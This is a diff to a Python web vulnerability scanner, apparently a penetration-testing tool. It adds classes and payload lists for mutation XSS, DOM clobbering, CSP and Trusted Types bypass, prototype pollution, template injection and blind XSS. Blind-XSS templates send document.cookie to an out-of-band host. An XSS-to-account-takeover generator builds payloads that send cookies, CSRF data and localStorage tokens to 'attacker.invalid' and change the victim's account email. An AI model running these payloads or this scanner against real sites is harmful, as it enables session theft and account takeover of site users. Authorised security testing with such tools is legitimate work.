@@ -3,10 +3,11 @@ import logging
 import random
 import re
 import string
+import uuid
 from dataclasses import dataclass
 from enum import Enum, auto
-from typing import List, Dict, Optional, Tuple
-from urllib.parse import urlparse, parse_qsl
+from typing import Any, Callable, List, Dict, Optional, Tuple
+from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 
 import requests as _requests
 
@@ -226,11 +227,9 @@ class XSSScanner(BaseScanner):
         if results is not None:
             self.results = results
 
-        if isinstance(url, list):
-            for u in url:
-                self.scan_url(u)
-        else:
-            self.scan_url(url)
+        urls = url if isinstance(url, list) else [url]
+        for u in urls:
+            self.scan_url(u)
 
         pages_with_forms = self.results.get("forms_meta", [])
         if pages_with_forms:
@@ -240,6 +239,9 @@ class XSSScanner(BaseScanner):
                     all_forms.extend(page["forms"])
             if all_forms:
                 self.scan_forms(all_forms)
+
+        # ─── Adım 4 eklentileri ───────────────────────────────────────────
+        self._run_advanced_xss_phase(urls)
 
     def scan_url(self, url: str):
         parsed = urlparse(url)
@@ -337,6 +339,7 @@ class XSSScanner(BaseScanner):
             return None
 
         hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
+        ato_gen = XSSToATOChain()
         for hit in hits:
             dom_confirmed = self._dom_verify_xss(url, param_name, hit.get("payload", ""))
             self.report_finding(
@@ -350,6 +353,10 @@ class XSSScanner(BaseScanner):
                 confidence="high" if dom_confirmed else "medium",
                 **hit,
             )
+            # XSS → ATO PoC for every confirmed finding
+            if dom_confirmed:
+                ato = ato_gen.generate_poc(url, param_name, hit.get("payload", ""))
+                self.report_finding(severity="Critical", **ato)
 
     def _dom_verify_xss(self, url: str, param_name: str, payload: str) -> bool:
         """
@@ -390,6 +397,93 @@ class XSSScanner(BaseScanner):
         except Exception as exc:
             logger.debug(f"[XSS] DOM doğrulama hatası ({test_url}): {exc!r}")
             return False
+
+    # ─── Adım 4: Advanced XSS Integration ────────────────────────────────
+
+    def _inject_param_fn(self, url: str, param: str, payload: str) -> str:
+        """Adapter: wraps inject_param for use as Callable by standalone probers."""
+        return self.inject_param(url, param, payload)
+
+    def _run_advanced_xss_phase(self, urls: List[str]) -> None:
+        """
+        Orchestrates Adım 4 advanced XSS probers:
+        mXSS, DOM Clobbering, CSP bypass, Trusted Types,
+        Prototype Pollution, Template Literal, Blind XSS, XSS→ATO.
+        """
+        mxss_prober    = MutationXSSProber()
+        clobber_prober = DOMClobberingProber()
+        csp_analyzer   = CSPAnalyzer()
+        tt_prober      = TrustedTypesBypassProber()
+        pp_prober      = PrototypePollutionXSSProber()
+        tl_prober      = TemplateLiteralInjectionProber()
+        blind_prober   = BlindXSSProber()
+        ato_gen        = XSSToATOChain()
+
+        for url in urls[:10]:
+            parsed = urlparse(url)
+            params = [p for p, _ in parse_qsl(parsed.query)]
+            if not params:
+                continue
+
+            # CSP analysis — one GET per URL
+            csp_info: Dict[str, Any] = {"present": False}
+            csp_bypasses: List[str] = []
+            try:
+                resp0 = self.session.get(url, timeout=8)
+                csp_info = csp_analyzer.analyze(resp0)
+                csp_bypasses = csp_analyzer.get_bypass_payloads(csp_info)
+                if csp_bypasses:
+                    logger.info("[XSS] CSP detected on %s → %d bypass payloads", url, len(csp_bypasses))
+            except Exception:
+                pass
+
+            # Prototype pollution — URL-level, no specific param
+            for f in pp_prober.probe(url, self.session):
+                self.report_finding(severity="High", **f)
+
+            for param in params[:5]:
+                inject_fn = self._inject_param_fn
+
+                # mXSS
+                for f in mxss_prober.probe(url, param, self.session, inject_fn):
+                    self.report_finding(severity="High", **f)
+
+                # DOM Clobbering
+                for f in clobber_prober.probe(url, param, self.session, inject_fn):
+                    self.report_finding(severity="Medium", **f)
+
+                # CSP bypass payloads
+                for payload in csp_bypasses[:6]:
+                    try:
+                        injected = inject_fn(url, param, payload)
+                        r = self.session.get(injected, timeout=8)
+                        if payload in r.text:
+                            finding = {
+                                "vuln_type": "CSP Bypass XSS",
+                                "url": url,
+                                "param": param,
+                                "payload": payload,
+                                "evidence": f"CSP bypass reflected; policy: {csp_info.get('raw','')[:100]}",
+                            }
+                            self.report_finding(severity="High", **finding)
+                            # Generate ATO PoC for confirmed CSP bypass
+                            ato = ato_gen.generate_poc(url, param, payload)
+                            self.report_finding(severity="Critical", **ato)
+                    except Exception:
+                        pass
+
+                # Trusted Types bypass
+                for f in tt_prober.probe(url, param, self.session, inject_fn):
+                    self.report_finding(severity="Medium", **f)
+
+                # Template literal injection
+                for f in tl_prober.probe(url, param, self.session, inject_fn):
+                    sev = "High" if f.get("confidence") == "high" else "Medium"
+                    self.report_finding(severity=sev, **f)
+
+                # Blind XSS (OOB)
+                for f in blind_prober.probe(url, param, self.session, inject_fn):
+                    self.report_finding(severity="High", **f)
 
     def scan_forms(self, forms: List[Dict]):
         logger.info(f"[XSS] Scanning {len(forms)} forms...")
@@ -576,3 +670,477 @@ def get_payloads_for_context(ctx: ReflectionType) -> List[str]:
     elif ctx == ReflectionType.COMMENT:
         return ["--> <script>alert(1)</script>"]
     return []
+
+
+# ===========================================================================
+# Adım 4 — Advanced XSS Payload Constants
+# ===========================================================================
+
+_MXSS_PAYLOADS: List[str] = [
+    # Namespace confusion / serialization differentials
+    "<listing><b title=></listing><img/src onerror=alert(1)>",
+    "<xmp><b title=></xmp><img/src onerror=alert(1)>",
+    "<noembed><b title=></noembed><img/src onerror=alert(1)>",
+    "<math><mtext><table><mglyph><style><!--</style><img/src/onerror=alert(1)>",
+    "<svg><style><img/src/onerror=alert(1)>{}</style></svg>",
+    "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style>"
+    "<img onerror=alert(1)>",
+    # ForeignObject namespace confusion
+    "<svg><foreignObject><div><table><tr><td>"
+    "<input type=\"image\" src onerror=alert(1)></td></tr></table></div></foreignObject></svg>",
+    # CSS animation event
+    "<style>@keyframes a{}</style><b style=\"animation-name:a\" onanimationstart=\"alert(1)\">",
+    # innerHTML re-serialization
+    "<p style=\"font-family:'foo</p><img src=x onerror=alert(1)>'\">",
+    # Template mutation
+    "<template><img src=x onerror=alert(1)></template>",
+]
+
+_DOM_CLOBBERING_PAYLOADS: List[str] = [
+    "<a id=defaultAnchor><a id=defaultAnchor name=body href=javascript:alert(1)>",
+    "<a id=x><a id=x name=y href=javascript:alert(1)>",
+    "<form id=login><input name=action value=javascript:alert(1)>",
+    "<form id=config><input name=token>",
+    "<form name=childNodes><input id=item>",
+    "<object name=__proto__><param name=nodeType value=1>",
+    "<img name=alert>",
+    "<html id=x><head></head><body><a id=x href=\"javascript:alert(1)\">",
+    "<img id=__proto__ name=polluted value=injected>",
+]
+
+_CSP_BYPASS_PAYLOADS: Dict[str, List[str]] = {
+    "unsafe-eval": [
+        "<script>eval('ale'+'rt(1)')</script>",
+        "<script>setTimeout('alert(1)',0)</script>",
+        "<script>Function('alert(1)')()</script>",
+        "<script>setInterval('alert(1)',99999999)</script>",
+    ],
+    "strict-dynamic": [
+        "<script>document.write('<script>alert(1)<\\/script>')</script>",
+        "<script>var s=document.createElement('script');s.src='data:,alert(1)';document.head.appendChild(s)</script>",
+    ],
+    "jsonp": [
+        "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
+        "<script src='https://maps.googleapis.com/maps/api/js?callback=alert(1)'></script>",
+        "<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.6/jquery.js'></script>",
+    ],
+    "base-uri": [
+        "<base href='https://attacker.invalid/'>",
+    ],
+    "object-src": [
+        "<object data='javascript:alert(1)'>",
+        "<embed src='javascript:alert(1)'>",
+    ],
+    "data-uri": [
+        "<script src='data:text/javascript,alert(1)'></script>",
+        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
+    ],
+}
+
+_TRUSTED_TYPES_PAYLOADS: List[str] = [
+    "<template shadowroot=open><script>alert(1)</script></template>",
+    "<script>location='javascript:alert(1)'</script>",
+    "<img src=x id=tt>",
+    "trustedTypes.createPolicy('default',{createHTML:s=>s})",
+    "<script>document.createRange().createContextualFragment('<img src=x onerror=alert(1)>')"
+    ".firstChild.onerror()</script>",
+]
+
+_PROTO_POLLUTION_XSS_PAYLOADS: List[str] = [
+    "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
+    "__proto__[src]=javascript:alert(1)",
+    "__proto__[href]=javascript:alert(1)",
+    "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
+    "constructor[prototype][src]=javascript:alert(1)",
+    "__proto__[html]=<img src=x onerror=alert(1)>",
+    "__proto__[url]=javascript:alert(1)",
+    "__proto__[template]=<img src=x onerror=alert(1)>",
+    "a[__proto__][innerHTML]=<img/src/onerror=alert(1)>",
+    "__proto__[defaultValue]=<img src=x onerror=alert(1)>",
+]
+
+_TEMPLATE_LITERAL_PAYLOADS: List[str] = [
+    "${7*7}",
+    "#{7*7}",
+    "{{7*7}}",
+    "${alert(1)}",
+    "#{alert(1)}",
+    "{{alert(1)}}",
+    "<%=7*7%>",
+    "<%= `alert(1)` %>",
+    "${constructor.constructor('alert(1)')()}",
+    "{{constructor.constructor('alert(1)')()}}",
+    "${new Function('alert(1)')()}",
+    "*{alert(1)}",
+    "@{alert(1)}",
+]
+
+_BLIND_XSS_SCRIPT_TPL = (
+    "<script>var i=new Image();"
+    "i.src='http://{oob}/xss?u='+encodeURIComponent(document.URL)"
+    "+'&c='+encodeURIComponent(document.cookie)"
+    "+'&r='+encodeURIComponent(document.referrer);</script>"
+)
+_BLIND_XSS_IMG_TPL = (
+    "<img src=x onerror=\"fetch('http://{oob}/xss?u='"
+    "+encodeURIComponent(location.href)+'&c='"
+    "+encodeURIComponent(document.cookie),{{mode:'no-cors'}})\">"
+)
+_BLIND_XSS_SVG_TPL = (
+    "<svg onload=\"var s=document.createElement('script');"
+    "s.src='http://{oob}/js/'+btoa(document.cookie);"
+    "document.head.appendChild(s)\">"
+)
+
+
+# ===========================================================================
+# Adım 4 — Advanced XSS Standalone Classes (SOLID)
+# ===========================================================================
+
+class MutationXSSProber:
+    """
+    mXSS: browser HTML parser differential exploitation.
+    Sanitizers may normalise the payload; the browser re-parses it in mutated form.
+    Single Responsibility: mutation XSS detection only.
+    """
+    _PAYLOADS: List[str] = _MXSS_PAYLOADS
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable[[str, str, str], str],
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        _exec_sigs = ("onerror=alert", "onload=alert", "onfocus=alert", "onanimationstart=")
+        for payload in self._PAYLOADS:
+            try:
+                injected = inject_fn(url, param, payload)
+                resp = session.get(injected, timeout=timeout)
+                if any(sig in resp.text for sig in _exec_sigs):
+                    findings.append({
+                        "vuln_type": "mXSS (Mutation XSS)",
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "mXSS execution signature detected in response",
+                    })
+            except Exception:
+                continue
+        return findings
+
+
+class DOMClobberingProber:
+    """
+    DOM Clobbering attack surface prober.
+    Single Responsibility: test payloads that clobber global DOM properties.
+    """
+    _PAYLOADS: List[str] = _DOM_CLOBBERING_PAYLOADS
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable[[str, str, str], str],
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        for payload in self._PAYLOADS:
+            try:
+                injected = inject_fn(url, param, payload)
+                resp = session.get(injected, timeout=timeout)
+                if payload in resp.text:
+                    findings.append({
+                        "vuln_type": "DOM Clobbering",
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "DOM clobbering payload reflected unescaped",
+                    })
+            except Exception:
+                continue
+        return findings
+
+
+class CSPAnalyzer:
+    """
+    Content-Security-Policy header analyzer + bypass payload selector.
+    Single Responsibility: CSP parsing and bypass strategy.
+    Open/Closed: extend _BYPASS_MAP to add new bypass categories.
+    """
+    _BYPASS_MAP: Dict[str, List[str]] = _CSP_BYPASS_PAYLOADS
+
+    def analyze(self, response: Any) -> Dict[str, Any]:
+        csp_raw = (
+            response.headers.get("Content-Security-Policy")
+            or response.headers.get("content-security-policy")
+            or ""
+        )
+        if not csp_raw:
+            return {"present": False, "directives": {}, "raw": ""}
+        directives: Dict[str, List[str]] = {}
+        for part in csp_raw.split(";"):
+            tokens = part.strip().split()
+            if tokens:
+                directives[tokens[0].lower()] = tokens[1:]
+        return {"present": True, "directives": directives, "raw": csp_raw}
+
+    def get_bypass_payloads(self, csp_info: Dict[str, Any]) -> List[str]:
+        if not csp_info.get("present"):
+            return []
+        directives = csp_info.get("directives", {})
+        script_vals = " ".join(
+            directives.get("script-src", directives.get("default-src", []))
+        )
+        payloads: List[str] = []
+        if "'unsafe-eval'" in script_vals:
+            payloads.extend(self._BYPASS_MAP["unsafe-eval"])
+        if "'strict-dynamic'" in script_vals:
+            payloads.extend(self._BYPASS_MAP["strict-dynamic"])
+        if any(d in script_vals for d in ("googleapis.com", "accounts.google.com")):
+            payloads.extend(self._BYPASS_MAP["jsonp"])
+        if "base-uri" not in directives:
+            payloads.extend(self._BYPASS_MAP["base-uri"])
+        if "object-src" not in directives:
+            payloads.extend(self._BYPASS_MAP["object-src"])
+        if not payloads:
+            payloads.extend(self._BYPASS_MAP["data-uri"])
+        # dedup preserving order
+        seen: set = set()
+        return [p for p in payloads if not (p in seen or seen.add(p))]  # type: ignore[func-returns-value]
+
+
+class TrustedTypesBypassProber:
+    """
+    Trusted Types policy bypass prober.
+    Single Responsibility: detect and bypass TT enforcement in modern browsers.
+    """
+    _PAYLOADS: List[str] = _TRUSTED_TYPES_PAYLOADS
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable[[str, str, str], str],
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        for payload in self._PAYLOADS:
+            try:
+                injected = inject_fn(url, param, payload)
+                resp = session.get(injected, timeout=timeout)
+                if payload in resp.text:
+                    findings.append({
+                        "vuln_type": "Trusted Types Bypass",
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "Trusted Types bypass payload reflected unescaped",
+                    })
+            except Exception:
+                continue
+        return findings
+
+
+class PrototypePollutionXSSProber:
+    """
+    Prototype Pollution → XSS gadget chain prober.
+    Injects __proto__ / constructor.prototype keys into query string.
+    Single Responsibility: PP-based XSS surface detection.
+    """
+    _PAYLOADS: List[str] = _PROTO_POLLUTION_XSS_PAYLOADS
+    _XSS_SIGS = ("onerror=alert", "src=javascript:", "innerHTML", "onload=alert")
+
+    def probe(
+        self,
+        url: str,
+        session: Any,
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        parsed = urlparse(url)
+        existing = parse_qsl(parsed.query)
+        for payload in self._PAYLOADS:
+            key, _, val = payload.partition("=")
+            params = existing + [(key, val or payload)]
+            test_url = urlunparse(parsed._replace(query=urlencode(params)))
+            try:
+                resp = session.get(test_url, timeout=timeout)
+                if any(sig in resp.text for sig in self._XSS_SIGS):
+                    findings.append({
+                        "vuln_type": "Prototype Pollution → XSS",
+                        "url": url,
+                        "param": key,
+                        "payload": payload,
+                        "evidence": "PP gadget XSS signature detected in response",
+                    })
+            except Exception:
+                continue
+        return findings
+
+
+class TemplateLiteralInjectionProber:
+    """
+    Template literal / server-side expression injection prober.
+    Detects ${...}, {{...}}, #{...} and <%=...%> evaluation.
+    Single Responsibility: template literal injection surface only.
+    """
+    _PAYLOADS: List[str] = _TEMPLATE_LITERAL_PAYLOADS
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable[[str, str, str], str],
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        for payload in self._PAYLOADS:
+            try:
+                injected = inject_fn(url, param, payload)
+                resp = session.get(injected, timeout=timeout)
+                # Expression evaluation: 7*7 = 49
+                if "49" in resp.text and "7" in payload:
+                    findings.append({
+                        "vuln_type": "Template Literal Injection (XSS/SSTI)",
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "Expression 7*7=49 evaluated server/client-side",
+                        "confidence": "high",
+                    })
+                elif payload in resp.text:
+                    findings.append({
+                        "vuln_type": "Template Literal Injection (XSS/SSTI)",
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "Template injection payload reflected unescaped",
+                        "confidence": "medium",
+                    })
+            except Exception:
+                continue
+        return findings
+
+
+class BlindXSSProber:
+    """
+    Out-of-band Blind XSS prober.
+    Sends payloads with OOB callback — actual confirmation via OAST/interactsh.
+    Single Responsibility: OOB XSS payload delivery only.
+    """
+
+    def __init__(self, oob_host: Optional[str] = None) -> None:
+        self.oob_host: str = oob_host or "oast.invalid"
+
+    def get_payloads(self) -> List[str]:
+        h = self.oob_host
+        return [
+            _BLIND_XSS_SCRIPT_TPL.format(oob=h),
+            _BLIND_XSS_IMG_TPL.format(oob=h),
+            _BLIND_XSS_SVG_TPL.format(oob=h),
+            f"<script src='http://{h}/x.js'></script>",
+            f"<iframe src='http://{h}/blind' style='display:none'></iframe>",
+            f"<link rel=stylesheet href='http://{h}/css'>",
+        ]
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable[[str, str, str], str],
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        findings: List[Dict[str, Any]] = []
+        for payload in self.get_payloads():
+            try:
+                injected = inject_fn(url, param, payload)
+                resp = session.get(injected, timeout=timeout)
+                if resp.status_code < 400:
+                    findings.append({
+                        "vuln_type": "Blind XSS (OOB)",
+                        "url": url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": (
+                            f"OOB payload delivered (HTTP {resp.status_code}). "
+                            f"Check {self.oob_host} for callbacks."
+                        ),
+                        "confidence": "low",
+                        "requires_oob_confirmation": True,
+                    })
+                    break  # one delivery per param is sufficient
+            except Exception:
+                continue
+        return findings
+
+
+class XSSToATOChain:
+    """
+    XSS → Account Takeover PoC generator.
+    Given a confirmed XSS, produces cookie-steal, CSRF-token-steal,
+    localStorage-steal, and email-change PoC payloads.
+    Single Responsibility: ATO exploitation chain generation only.
+    """
+
+    @staticmethod
+    def generate_poc(
+        xss_url: str,
+        param: str,
+        payload: str,
+        attacker_host: str = "attacker.invalid",
+    ) -> Dict[str, Any]:
+        uid = uuid.uuid4().hex[:8]
+        h = attacker_host
+        return {
+            "vuln_type": "XSS → Account Takeover (PoC)",
+            "source_xss_url": xss_url,
+            "source_param": param,
+            "source_payload": payload,
+            "attacker_host": h,
+            "session_id": uid,
+            "pocs": {
+                "cookie_steal": {
+                    "description": "Cookie exfiltration via fetch beacon",
+                    "payload": (
+                        f"<img src=x onerror=\"fetch('http://{h}/steal?s={uid}"
+                        f"&c='+encodeURIComponent(document.cookie),{{mode:'no-cors'}})\">"
+                    ),
+                },
+                "csrf_token_steal": {
+                    "description": "CSRF token + settings page exfiltration",
+                    "payload": (
+                        f"<img src=x onerror=\"fetch(location.origin+'/api/user/settings',"
+                        f"{{credentials:'include'}}).then(r=>r.text()).then(d=>"
+                        f"fetch('http://{h}/csrf?s={uid}&d='+btoa(d),{{mode:'no-cors'}}))\">"
+                    ),
+                },
+                "localstorage_steal": {
+                    "description": "localStorage / sessionStorage token theft",
+                    "payload": (
+                        f"<img src=x onerror=\"var t=localStorage.getItem('token')"
+                        f"||sessionStorage.getItem('token')||'';"
+                        f"fetch('http://{h}/token?s={uid}&t='+encodeURIComponent(t)"
+                        f",{{mode:'no-cors'}})\">"
+                    ),
+                },
+                "account_takeover": {
+                    "description": "Email-change account takeover via CSRF",
+                    "payload": (
+                        f"<script>fetch(location.origin+'/api/account/email',{{"
+                        f"method:'POST',credentials:'include',"
+                        f"headers:{{'Content-Type':'application/json'}},"
+                        f"body:JSON.stringify({{email:'pwned_{uid}@{h}'"
+                        f"}})}})</script>"
+                    ),
+                },
+            },
+            "severity": "Critical",
+            "confidence": "high",
+        }
